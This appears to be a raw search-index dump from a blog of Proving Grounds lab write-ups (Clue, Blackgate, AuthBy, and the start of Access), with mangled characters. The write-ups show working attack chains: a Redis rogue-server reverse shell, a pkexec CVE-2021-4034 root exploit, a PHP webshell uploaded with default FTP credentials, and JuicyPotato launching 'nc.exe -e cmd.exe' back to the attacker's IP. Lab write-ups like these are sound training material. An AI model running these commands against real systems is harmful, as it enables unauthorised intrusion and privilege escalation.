.sshroot@clue:~# cat proof.txtThe proof is in another fileroot@clue:~# cat proof_youtriedharder.txtd53d4c8221b96b8d2c492035c246140eroot@clue:~# hostnameclueroot@clue:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever3: ens192: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:ab:cb:23 brd ff:ff:ff:ff:ff:ff inet 192.168.225.240/24 brd 192.168.225.255 scope global ens192 valid_lft forever preferred_lft foreverroot@clue:~# ```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Blackgate", "url": "/posts/BlackGate/", "categories": "Proving Grounds, Practice", "tags": "redis, Public Exploit, pkexec, PrivEsc", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/BlackGate]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt 192.168.182.176PORT STATE SERVICE REASON ...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/BlackGate]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt 192.168.182.176PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 61 OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDErzUX3Jeg2oRWhqelAA3/QrsFYoyDVaXbJK0ghZTX1i3mZY8SXopUZC09JD/6S+Ye+nFW2/6rnXHltIVWEALmPDrlDOV5m+LGujzXqc5YJcylNnwSjz9TjCHlPa+PrMdyp2NyT+Wt2w6jhVWA1sowq8R4ZDkqvpQwz9rUOVk5IRiV6fgdEuHBBXKQZu9S00iPNC5hhfmclk5k2dPtFqQRlosZfjDjv5E8Zo8YwLGonmWciNQQB8DWX47R08noPMseQMYR707ABcIgx4+DKMZ7/HlOzqwoqFdyvMSdPf5lz+cPG/aI0N6qua80uxbXg0rvMNQuZd73d5jA+Yp3eIkI4lHQqjXO4B0Gbl4lpcHTWCdUI93dLbBy13J0NdTG+vqkXszDBXr19rWaD+yeXg8FQt5ViHr7N/Pr77zFjOiAq4AjRNt6j8e+kX0Cqwov1RwUc4R1JPfmEIZqm8Ds/z+jDhkhLoJP4yjE8xNHhOz8lUk+bZh3zGuS3+97Mrkh3Rs=| 256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPed4/WiZ+RjcALVwQnLf74Byu1yb40zjCfDT+DBa4jiTzciU5Ql1fhEzanZGgt5VuK0y5ZAgG7f54yL9iVcaU8=| 256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJLFhMCuSltbhF2Mj0Xz0A3ZSEhcu8LOF9hX8bqGirVH6379/tcp open redis syn-ack ttl 61 Redis key-value store 4.0.14Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Redis Enumeration (Port 6379) â¤µï¸Lets enumerate on Redis with this Tool ðŸ”»https://github.com/n0b0dyCN/redis-rogue-server```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/Proving_Ground/Practice/BlackGate/redis-rogue-server]â””â”€$ python3 redis-rogue-server.py --rhost 192.168.182.176 --lhost 192.168.45.214______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__|| |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig[info] TARGET 192.168.182.176:6379[info] SERVER 192.168.45.214:21000[info] Setting master...[info] Setting dbfilename...[info] Loading module...[info] Temerory cleaning up...What do u want, [i]nteractive shell or [r]everse shell: r[info] Open reverse shell...Reverse server address: 192.168.45.214Reverse server port: 2222[info] Reverse shell payload sent.[info] Check at 192.168.45.214:2222[info] Unload module...```{: .nolineno}I got a connection callback on port 2222 lets enumerate further now ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/BlackGate]â””â”€$ rlwrap nc -lvnp 2222listening on [any] 2222 ...idpython3 -c 'import pty;pty.spawn(\"/bin/bash\");'export TERM=xtermCtrl + zstty raw -echo ; fgresetconnect to [192.168.45.214] from (UNKNOWN) [192.168.182.176] 47690uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)prudence@blackgate:/tmp$ whoamiwhoamiprudenceprudence@blackgate:/tmp$ ididuid=1001(prudence) gid=1001(prudence) groups=1001(prudence)prudence@blackgate:/tmp$ ```{: .nolineno}I checked the sudoers privileges and I got this `redis-status` command that can lets me a root user.```bashprudence@blackgate:/tmp$ sudo -lsudo -lMatching Defaults entries for prudence on blackgate: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser prudence may run the following commands on blackgate: (root) NOPASSWD: /usr/local/bin/redis-statusprudence@blackgate:/tmp$```{: .nolineno}But this require reverse-engineering so I have to find another way to move forward lets see ðŸ”»```bashprudence@blackgate:/tmp$ sudo -Vsudo -VSudo version 1.9.1Sudoers policy plugin version 1.9.1Sudoers file grammar version 48Sudoers I/O plugin version 1.9.1Sudoers audit plugin version 1.9.1prudence@blackgate:/tmp$ find / -perm -u=s -type f 2>/dev/nullfind / -perm -u=s -type f 2>/dev/null/snap/core20/1405/usr/bin/chfn/snap/core20/1405/usr/bin/chsh/snap/core20/1405/usr/bin/gpasswd/snap/core20/1405/usr/bin/mount/snap/core20/1405/usr/bin/newgrp/snap/core20/1405/usr/bin/passwd/snap/core20/1405/usr/bin/su/snap/core20/1405/usr/bin/sudo/snap/core20/1405/usr/bin/umount/snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core20/1405/usr/lib/openssh/ssh-keysign/snap/snapd/15177/usr/lib/snapd/snap-confine/snap/core18/1885/bin/mount/snap/core18/1885/bin/ping/snap/core18/1885/bin/su/snap/core18/1885/bin/umount/snap/core18/1885/usr/bin/chfn/snap/core18/1885/usr/bin/chsh/snap/core18/1885/usr/bin/gpasswd/snap/core18/1885/usr/bin/newgrp/snap/core18/1885/usr/bin/passwd/snap/core18/1885/usr/bin/sudo/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core18/1885/usr/lib/openssh/ssh-keysign/snap/core18/2344/bin/mount/snap/core18/2344/bin/ping/snap/core18/2344/bin/su/snap/core18/2344/bin/umount/snap/core18/2344/usr/bin/chfn/snap/core18/2344/usr/bin/chsh/snap/core18/2344/usr/bin/gpasswd/snap/core18/2344/usr/bin/newgrp/snap/core18/2344/usr/bin/passwd/snap/core18/2344/usr/bin/sudo/snap/core18/2344/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core18/2344/usr/lib/openssh/ssh-keysign/usr/bin/pkexec/usr/bin/sudo/usr/bin/at/usr/bin/chfn/usr/bin/chsh/usr/bin/passwd/usr/bin/mount/usr/bin/su/usr/bin/umount/usr/bin/gpasswd/usr/bin/fusermount/usr/bin/newgrp/usr/lib/snapd/snap-confine/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/libexec/polkit-agent-helper-1```{: .nolineno}I checked the SUIDs and GUIDs , Turns out I got **pkexec** running on this machine lets check its version, If it is vulnerable then I will be using an unintended path to root the machine by exploiting pkexec like this ðŸ”»```{: .nolineno}prudence@blackgate:/tmp$ /usr/bin/pkexec --version/usr/bin/pkexec --versionpkexec version 0.105prudence@blackgate:/tmp$ wget http://192.168.45.214/pkexec_CVE-2021-4034.pywget http://192.168.45.214/pkexec_CVE-2021-4034.py--2024-06-15 16:24:58-- http://192.168.45.214/pkexec_CVE-2021-4034.pyConnecting to 192.168.45.214:80... connected.HTTP request sent, awaiting response... 200 OKLength: 3067 (3.0K) [text/x-python]Saving to: â€˜pkexec_CVE-2021-4034.pyâ€™pkexec_CVE-2021-403 0%[ ] 0 --.-KB/s pkexec_CVE-2021-403 100%[===================>] 3.00K --.-KB/s in 0s 2024-06-15 16:24:59 (6.98 MB/s) - â€˜pkexec_CVE-2021-4034.pyâ€™ saved [3067/3067]prudence@blackgate:/tmp$ chmod +x pkexec_CVE-2021-4034.pychmod +x pkexec_CVE-2021-4034.pyprudence@blackgate:/tmp$ python3 pkexec_CVE-2021-4034.pypython3 pkexec_CVE-2021-4034.pyDo you want to choose a custom payload? y/n (n use default payload) [+] Cleaning pervious exploiting attempt (if exist)[+] Creating shared library for exploit code.[+] Finding a libc library to call execve[+] Found a library at [+] Call execve() with chosen payload[+] Enjoy your root shell# whoamiwhoamiroot# cd /rootcd /root# ls -alls -altotal 32drwx------ 5 root root 4096 Jun 15 16:18 .drwxr-xr-x 20 root root 4096 Dec 6 2021 ..lrwxrwxrwx 1 root root 9 Dec 6 2021 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Aug 14 2019 .bashrcdrwx------ 2 root root 4096 Dec 6 2021 .cache-rw-r--r-- 1 root root 161 Sep 16 2020 .profiledrwxr-xr-x 2 root root 4096 Dec 6 2021 .ssh-rw------- 1 root root 33 Jun 15 16:18 proof.txtdrwxr-xr-x 3 root root 4096 Dec 6 2021 snap# cat proof.txtcat proof.txtdde6f9afbcae6b49c60cbd868c66283d# cd /homecd /home# ls -alls -altotal 12drwxr-xr-x 3 root root 4096 Dec 6 2021 .drwxr-xr-x 20 root root 4096 Dec 6 2021 ..drwxr-xr-x 2 prudence prudence 4096 Dec 6 2021 prudence# cd prudencecd prudence# dirdirlocal.txt notes.txt# cat local.txtcat local.txt4ba549e4f04403fa3148ec258b5e2839# cat notes.txtcat notes.txt[âœ”] Setup redis server[âœ–] Turn on protected mode[âœ”] Implementation of the redis-status[âœ”] Allow remote connections to the redis server # ```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Authby", "url": "/posts/AuthBy/", "categories": "Proving Grounds, Practice", "tags": "Windows, Juicy, Potato, SeImpersonatePrivilege, FTP", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/AuthBy]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.235.46Nmap scan report for 192.168.235.46...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/AuthBy]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.235.46Nmap scan report for 192.168.235.46Host is up, received user-set (0.12s latency).Scanned at 2024-06-15 09:27:07 IST for 277sNot shown: 65531 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 125 zFTPServer 6.0 build 2011-10-17| ftp-anon: Anonymous FTP login allowed (FTP code 230)| total 9680| ---------- 1 root root 5610496 Oct 18 2011 zFTPServer.exe| ---------- 1 root root 25 Feb 10 2011 UninstallService.bat| ---------- 1 root root 4284928 Oct 18 2011 Uninstall.exe| ---------- 1 root root 17 Aug 13 2011 StopService.bat| ---------- 1 root root 18 Aug 13 2011 StartService.bat| ---------- 1 root root 8736 Nov 09 2011 Settings.ini| dr-xr-xr-x 1 root root 512 Jun 15 10:57 log| ---------- 1 root root 2275 Aug 08 2011 LICENSE.htm| ---------- 1 root root 23 Feb 10 2011 InstallService.bat| dr-xr-xr-x 1 root root 512 Nov 08 2011 extensions| dr-xr-xr-x 1 root root 512 Nov 08 2011 certificates|_dr-xr-xr-x 1 root root 512 Mar 23 13:28 accounts242/tcp open http syn-ack ttl 125 Apache httpd 2.2.21 ((Win32) PHP/5.3.8)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: 401 Authorization Required|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8| http-auth: | HTTP/1.1 401 Authorization Required\\x0D|_ Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!3145/tcp open zftp-admin syn-ack ttl 125 zFTPServer admin3389/tcp open ssl/ms-wbt-server? syn-ack ttl 125| rdp-ntlm-info: | Target_Name: LIVDA| NetBIOS_Domain_Name: LIVDA| NetBIOS_Computer_Name: LIVDA| DNS_Domain_Name: LIVDA| DNS_Computer_Name: LIVDA| Product_Version: 6.0.6001|_ System_Time: 2024-06-15T04:01:38+00:00|_ssl-date: 2024-06-15T04:01:43+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=LIVDA| Issuer: commonName=LIVDA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2024-03-22T06:28:30| Not valid after: 2024-09-21T06:28:30| MD5: 9061:326a:78f0:b80d:136a:6894:a2b8:935e| SHA-1: 45cf:80bf:d688:9930:4453:f7d3:a8ff:25f1:b4fd:3935| -----BEGIN CERTIFICATE-----| MIICzjCCAbagAwIBAgIQ2xPxHd7u7p5NNxL2kj5ujzANBgkqhkiG9w0BAQUFADAQ| MQ4wDAYDVQQDEwVMSVZEQTAeFw0yNDAzMjIwNjI4MzBaFw0yNDA5MjEwNjI4MzBa| MBAxDjAMBgNVBAMTBUxJVkRBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC| AQEA88lD0jVfQxqaC8iHdskmC7PBDr4YGRoFVFkRsr4ooBcGovFJXyCsHX16eNpM| kwINUsC/auUX7oa8GNqkSwlBUVuEZncF7pk5uXxp16/69xDDa7SLDtDtBB1osP3j| y7eWiIDvkWaWvA4t6/D9hUJpp3nnfCLIMjEU2mQEuYylxrfyB8qTzRf3o8rVsQ2U| 7TI0To215luOuFtSBT05Ex7W6AzxhcHKcuQzs+c2wrPRUUT+ePluvlFSuEqxoIHp| 9eZ1g9M1D8aQ1/sDCNt3Ye5vcrudW7oWd+/kwSkCreI1Q5o0Ng6HzAWyPWPPiW3D| S/oHUU1b8660Xg5HD7I68smfvwIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAJcCw20pp3BEl3gplqDv| SFPyI9ex1Hx4eCx5o4Gtb24S6VM2xbktxcwVAuaygccOXoxYKUDnBhsQOWSe2WPn| Sp1MvAzjkwbZxpu7Z8HbTHbUFC1FquIA78910iJx5BzILie4CyRCaBUP4mGfNiLo| rjxr/N9nbZ/rIlV8EuoGX6MfN0F+cFrQwqeq84iDZovZMlCwppUaJeLMUIBO8bWp| lHo60M45eaIaLnW7NsyNgv0rLZHfRx8M69vYcNB3nQSYzOhUMIiLeoiNozdqfSf+| bbRwceKbES+6P0BWU4FzhxTTmNJl65EU0UFDiffVgtjBkiC85K3aT0/axW3dsMno| vIw=|_-----END CERTIFICATE-----Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 0s, deviation: 0s, median: 0s```{: .nolineno}## FTP Enumeration â¤µï¸I checked FTP file system with Anonymous Access ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/AuthBy]â””â”€$ ftp 192.168.235.46 21Connected to 192.168.235.46.220 zFTPServer v6.0, build 2011-10-17 15:25 ready.Name (192.168.235.46:kali): Anonymous331 User name received, need password.Password: 230 User logged in, proceed.Remote system type is UNIX.Using binary mode to transfer files.ftp> dir229 Entering Extended Passive Mode (|||2048|)150 Opening connection for /bin/ls.total 9680---------- 1 root root 5610496 Oct 18 2011 zFTPServer.exe---------- 1 root root 25 Feb 10 2011 UninstallService.bat---------- 1 root root 4284928 Oct 18 2011 Uninstall.exe---------- 1 root root 17 Aug 13 2011 StopService.bat---------- 1 root root 18 Aug 13 2011 StartService.bat---------- 1 root root 8736 Nov 09 2011 Settings.inidr-xr-xr-x 1 root root 512 Jun 15 10:57 log---------- 1 root root 2275 Aug 08 2011 LICENSE.htm---------- 1 root root 23 Feb 10 2011 InstallService.batdr-xr-xr-x 1 root root 512 Nov 08 2011 extensionsdr-xr-xr-x 1 root root 512 Nov 08 2011 certificatesdr-xr-xr-x 1 root root 512 Mar 23 13:28 accounts226 Closing data connection.ftp> cd log250 CWD Command successful.ftp> ls229 Entering Extended Passive Mode (|||2049|)150 Opening connection for /bin/ls.total 21043---------- 1 root root 136 Mar 30 2020 stor-2020-03-30.log---------- 1 root root 386 Mar 30 2020 retr-2020-03-30.log---------- 1 root root 0 Jun 15 10:57 log-2024-06-14.log---------- 1 root root 370 Mar 23 13:28 log-2024-03-22.log---------- 1 root root 574 Jul 10 2020 log-2020-07-09.log---------- 1 root root 71178 Mar 30 2020 log-2020-03-30.log---------- 1 root root 930 Mar 27 2020 log-2020-03-26.log---------- 1 root root 568 Mar 25 2020 log-2020-03-24.log---------- 1 root root 568 Mar 05 2015 log-2015-03-05.log---------- 1 root root 1134 Feb 28 2015 log-2015-02-27.log---------- 1 root root 572 Nov 03 2014 log-2014-11-03.log---------- 1 root root 1712 May 22 2013 log-2013-05-22.log---------- 1 root root 2440 Jun 12 2012 log-2012-06-11.log---------- 1 root root 1142 May 25 2012 log-2012-05-24.log---------- 1 root root 208 Dec 15 2011 log-2011-12-15.log---------- 1 root root 944 Dec 15 2011 log-2011-12-14.log---------- 1 root root 1150 Dec 14 2011 log-2011-12-13.log---------- 1 root root 208 Dec 13 2011 log-2011-12-12.log---------- 1 root root 6877584 Nov 09 2011 log-2011-11-09.log---------- 1 root root 14575458 Nov 09 2011 log-2011-11-08.log226 Closing data connection.ftp> get log-2024-03-22.loglocal: log-2024-03-22.log remote: log-2024-03-22.log229 Entering Extended Passive Mode (|||2050|)550 Access deniedftp> cd ..dir250 CWD Command successful.ftp> dir229 Entering Extended Passive Mode (|||2051|)150 Opening connection for /bin/ls.total 9680---------- 1 root root 5610496 Oct 18 2011 zFTPServer.exe---------- 1 root root 25 Feb 10 2011 UninstallService.bat---------- 1 root root 4284928 Oct 18 2011 Uninstall.exe---------- 1 root root 17 Aug 13 2011 StopService.bat---------- 1 root root 18 Aug 13 2011 StartService.bat---------- 1 root root 8736 Nov 09 2011 Settings.inidr-xr-xr-x 1 root root 512 Jun 15 10:57 log---------- 1 root root 2275 Aug 08 2011 LICENSE.htm---------- 1 root root 23 Feb 10 2011 InstallService.batdr-xr-xr-x 1 root root 512 Nov 08 2011 extensionsdr-xr-xr-x 1 root root 512 Nov 08 2011 certificatesdr-xr-xr-x 1 root root 512 Mar 23 13:28 accounts226 Closing data connection.ftp> cd accounts250 CWD Command successful.ftp> dir229 Entering Extended Passive Mode (|||2053|)150 Opening connection for /bin/ls.total 4dr-xr-xr-x 1 root root 512 Mar 23 13:28 backup---------- 1 root root 764 Mar 23 13:28 acc[Offsec].uac---------- 1 root root 1032 Jun 15 11:01 acc[anonymous].uac---------- 1 root root 926 Mar 23 13:28 acc[admin].uac226 Closing data connection.ftp> get acc[Offsec].uaclocal: acc[Offsec].uac remote: acc[Offsec].uac229 Entering Extended Passive Mode (|||2054|)550 Access deniedftp> cd backup250 CWD Command successful.ftp> dir229 Entering Extended Passive Mode (|||2055|)150 Opening connection for /bin/ls.total 4---------- 1 root root 764 Jul 10 2020 acc[Offsec].uac---------- 1 root root 1030 Jul 10 2020 acc[anonymous].uac---------- 1 root root 926 Jul 10 2020 acc[admin].uac226 Closing data connection.ftp>```{: .nolineno}Now I simply try the FTP login with default cred like `admin : admin` and I got in ðŸ”» ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/AuthBy]â””â”€$ ftp 192.168.235.46 21Connected to 192.168.235.46.220 zFTPServer v6.0, build 2011-10-17 15:25 ready.Name (192.168.235.46:kali): admin\t331 User name received, need password.Password: 230 User logged in, proceed.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls229 Entering Extended Passive Mode (|||2061|)150 Opening connection for /bin/ls.total 3-r--r--r-- 1 root root 76 Nov 08 2011 index.php-r--r--r-- 1 root root 45 Nov 08 2011 .htpasswd-r--r--r-- 1 root root 161 Nov 08 2011 .htaccess226 Closing data connection.ftp> lcd /home/kali/Downloads/reverse-shellLocal directory now: /home/kali/Downloads/reverse-shellftp> put php_webshell.phplocal: php_webshell.php remote: php_webshell.php229 Entering Extended Passive Mode (|||2062|)150 File status okay; about to open data connection.100% |******************************************************************************************| 20320 173.46 KiB/s 00:00 ETA226 Closing data connection.20320 bytes sent in 00:00 (59.15 KiB/s)ftp> ```{: .nolineno}I got access to the web servers page so I uploaded my `php_webshell.php` file and got the webshell ðŸ”»![Image](Pasted%20image%2020240615105724.png)Then I got a stable shell and checked the system information's with `systeminfo` command and the privileges.```powershellC:\\wamp\\www>systeminfosysteminfoHost Name: LIVDAOS Name: Microsoftr Windows Serverr 2008 Standard OS Version: 6.0.6001 Service Pack 1 Build 6001OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 92573-OEM-7502905-27565Original Install Date: 12/19/2009, 11:25:57 AMSystem Boot Time: 6/14/2024, 8:51:07 PMSystem Manufacturer: VMware, Inc.System Model: VMware Virtual PlatformSystem Type: X86-based PCProcessor(s): 1 Processor(s) Installed. [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 MhzBIOS Version: Phoenix Technologies LTD 6.00, 11/12/2020Windows Directory: C:\\WindowsSystem Directory: C:\\Windows\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (GMT-08:00) Pacific Time (US & Canada)Total Physical Memory: 2,047 MBAvailable Physical Memory: 1,648 MBPage File: Max Size: 1,983 MBPage File: Available: 1,532 MBPage File: In Use: 451 MBPage File Location(s): N/ADomain: WORKGROUPLogon Server: N/AHotfix(s): N/ANetwork Card(s): N/AC:\\wamp\\www>```{: .nolineno}I got SeImpersonatePrivilege Enabled so lets use any potato tool to impersonate to higher privileged user ðŸ”»![Image](Pasted%20image%2020240615105520.png)I will be using JuicyPotato Tool because this system is from 2008 old that's why.```powershellC:\\wamp\\www>C:\\wamp\\www>Juicy.Potato.x86.exe -l 1337 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\" -p c:\\windows\\system32\\cmd.exe -a \"/c C:\\wamp\\www\\nc.exe -e cmd.exe 192.168.45.214 4444\" -t *Juicy.Potato.x86.exe -l 1337 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\" -p c:\\windows\\system32\\cmd.exe -a \"/c C:\\wamp\\www\\nc.exe -e cmd.exe 192.168.45.214 4444\" -t *Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337....[+] authresult 0{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKC:\\wamp\\www>```{: .nolineno}I got the call back on port 4444 on attackers machine and I am `nt authority\\system` , that's huge !!```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/AuthBy]â””â”€$ rlwrap nc -lvnp 4444 listening on [any] 4444 ...connect to [192.168.45.214] from (UNKNOWN) [192.168.235.46] 49181Microsoft Windows [Version 6.0.6001]Copyright (c) 2006 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>C:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>cd C:\\Userscd C:\\UsersC:\\Users>dirdir Volume in drive C has no label. Volume Serial Number is BCAD-595B Directory of C:\\Users07/09/2020 11:07 AM .07/09/2020 11:07 AM ..02/14/2010 05:16 PM Administrator06/14/2024 09:42 PM apache01/19/2008 02:40 AM Public 0 File(s) 0 bytes 5 Dir(s) 6,029,238,272 bytes freeC:\\Users>tree /f /atree /f /aFolder PATH listingVolume serial number is 0022F7D4 BCAD:595BC:.+---Administrator| +---Contacts| +---Desktop| | proof.txt| | WampServer.lnk| | zFTPServer Administration.lnk| | | +---Documents| +---Downloads| | WampServer2.2a-x64.exe| | zFTPServer_Suite_Setup.exe| | | +---Favorites| | +---Links| | | Customize Links.url| | | | | +---Microsoft Websites| | | IE Add-on site.url| | | IE site on Microsoft.com.url| | | Marketplace.url| | | Microsoft At Home.url| | | Microsoft At Work.url| | | Welcome to IE7.url| | | | | +---MSN Websites| | | MSN Autos.url| | | MSN Entertainment.url| | | MSN Money.url| | | MSN Sports.url| | | MSN.url| | | MSNBC News.url| | | | | \\---Windows Live| | Get Windows Live.url| | Windows Live Gallery.url| | Windows Live Mail.url| | Windows Live Spaces.url| | | +---Links| | Documents.lnk| | Music.lnk| | Pictures.lnk| | Public.lnk| | Recently Changed.lnk| | Searches.lnk| | | +---Music| +---Pictures| +---Saved Games| +---Searches| | Recent Documents.search-ms| | Recent E-mail.search-ms| | Recent Music.search-ms| | Recent Pictures and Videos.search-ms| | Recently Changed.search-ms| | Shared By Me.search-ms| | | \\---Videos+---apache| | certutil.log| | | +---Contacts| +---Desktop| | local.txt| | | +---Documents| +---Downloads| +---Favorites| | | disable.url| | | | | +---Links| | | Customize Links.url| | | | | +---Microsoft Websites| | | IE Add-on site.url| | | IE site on Microsoft.com.url| | | Marketplace.url| | | Microsoft At Home.url| | | Microsoft At Work.url| | | Welcome to IE7.url| | | | | +---MSN Websites| | | MSN Autos.url| | | MSN Entertainment.url| | | MSN Money.url| | | MSN Sports.url| | | MSN.url| | | MSNBC News.url| | | | | \\---Windows Live| | Get Windows Live.url| | Windows Live Gallery.url| | Windows Live Mail.url| | Windows Live Spaces.url| | | +---Links| | Documents.lnk| | Music.lnk| | Pictures.lnk| | Public.lnk| | Recently Changed.lnk| | Searches.lnk| | | +---Music| +---Pictures| +---Saved Games| +---Searches| | Recent Documents.search-ms| | Recent E-mail.search-ms| | Recent Music.search-ms| | Recent Pictures and Videos.search-ms| | Recently Changed.search-ms| | Shared By Me.search-ms| | | \\---Videos\\---Public +---Documents +---Downloads +---Music | \\---Sample Music +---Pictures | \\---Sample Pictures \\---Videos \\---Sample VideosC:\\Users>type apache\\Desktop\\local.txttype apache\\Desktop\\local.txtbb03eea00e27705d13b2922274499a85C:\\Users>type administrator\\Desktop\\local.txttype administrator\\Desktop\\local.txtThe system cannot find the file specified.C:\\Users>type Administrator\\Desktop\\proof.txttype Administrator\\Desktop\\proof.txt80c1fbca87d095b957beea863934195eC:\\Users>```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Access", "url": "/posts/Access/", "categories": "Proving Grounds, Practice", "tags": "SeManageVolumePrivilege, Rubeus, PowerView, Kerberosting, dll hijacking, PrivEsc, Windows, RunAsCs, File Upload, SPN, Active Directory", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Access]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.235.187Nmap scan report for 192.168.235.1...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Access]â””â”€$ sudo nmap -sC -sV -p- -T4 -vv -oN Nmap_Results.txt -Pn 192.168.235.187Nmap scan report for 192.168.235.187Host is up, received user-set (0.10s latency).Scanned at 2024-06-13 15:29:19 IST for 335sNot shown: 65514 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 125 Simple DNS Plus80/tcp open http syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)| http-methods: | Supported Methods: POST OPTIONS HEAD GET TRACE|_ Potentially risky methods: TRACE|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34|_http-title: Access The Event|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.788/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-06-13 10:03:21Z)135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack ttl 125464/tcp open kpasswd5? syn-ack ttl 125593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack ttl 1253268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack 